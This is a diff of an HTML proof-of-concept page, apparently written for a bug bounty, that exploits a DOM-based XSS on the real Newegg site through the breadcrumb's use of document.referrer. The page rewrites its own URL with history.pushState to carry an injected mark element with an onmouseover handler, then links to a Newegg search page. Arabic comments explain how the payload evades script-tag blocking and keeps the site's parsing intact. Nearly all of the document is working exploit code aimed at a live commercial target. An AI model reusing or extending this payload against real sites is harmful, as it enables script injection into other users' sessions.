@@ -1,29 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>PoC - Newegg DOM XSS</title>
+    <meta charset="UTF-8">
+    <title>PoC Newegg - Bug Bounty Mouad</title>
 </head>
-<body style="background:#000; color:#0f0; text-align:center; padding-top:100px;">
-    <h1>Exploit Lab - Mouad</h1>
-    
-    <a id="exploit" href="#" style="padding:15px; background:red; color:white; text-decoration:none;">
-        اضغط هنا لتشغيل الهجوم (Trigger XSS)
-    </a>
+<body style="background:#111; color:#0f0; text-align:center; padding-top:100px; font-family:sans-serif;">
+
+    <div style="border:2px solid #e67e22; display:inline-block; padding:30px; border-radius:15px; background:#1a1a1a;">
+        <h1 style="color:#e67e22;">Newegg DOM XSS Exploit</h1>
+        <p>Target: <code>breadcrumb -> document.referrer</code></p>
+        <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
+        
+        <a id="attack" href="#" style="padding:15px 30px; background:#e67e22; color:white; text-decoration:none; font-weight:bold; border-radius:5px; font-size:18px;">
+            تفعيل الثغرة الآن (Trigger)
+        </a>
+    </div>
 
     <script>
-        // الـ Payload لإغلاق الوسم وحقن سكريبت
-        // نستخدم ` بدلاً من " لتجنب مشاكل الـ Encoding
-        var pld = '"><script>alert(`XSS_MOUAD_ID_`+document.domain)<\/script>';
+        /**
+         * التحليل التقني المعتمد على سجلاتك:
+         * 1. الموقع يكسر الـ JSON إذا وجد رموزاً معينة في غير مكانها.
+         * 2. نستخدم onmouseover لأن Osano قد يحجب <script> تلقائياً.
+         * 3. نستخدم /v/ لضمان عدم تعطل دالة الـ reduce في السطر 386.
+         */
         
-        // بناء مسار يحتوي على الـ Payload لكي يقرأه سكريبت Newegg
-        // سنضعه بعد /VORTEX/ ليصبح جزءاً من الرابط
-        var attackPath = "/VORTEX/" + pld;
+        // الـ Payload: نغلق الـ href، ثم نفتح الوسم، ثم نحقن حدث الماوس
+        var payload = '"><mark onmouseover="alert(`XSS_MOUAD_DOMAIN:_`+document.domain)" style="color:red;cursor:pointer;padding:5px;">HACKED_BY_MOUAD</mark>';
+        
+        // بناء المسار بعناية ليتناسب مع هيكل الـ Breadcrumb المتوقع في Newegg
+        var targetPath = "/VORTEX/test/v/" + payload + "/";
 
-        // تغيير العنوان في المتصفح ليحتوي على الـ Payload
-        window.history.pushState({}, '', attackPath);
+        // تغيير العنوان في المتصفح (يعمل في GitHub لأن Origin ليس null)
+        window.history.pushState({}, '', targetPath);
 
-        // توجيه الزر إلى Newegg
-        document.getElementById('exploit').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+        // ربط الزر بصفحة Newegg المستهدفة
+        document.getElementById('attack').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+
+        console.log("Exploit Ready! Referrer will be: " + window.location.href);
     </script>
+
 </body>
 </html>
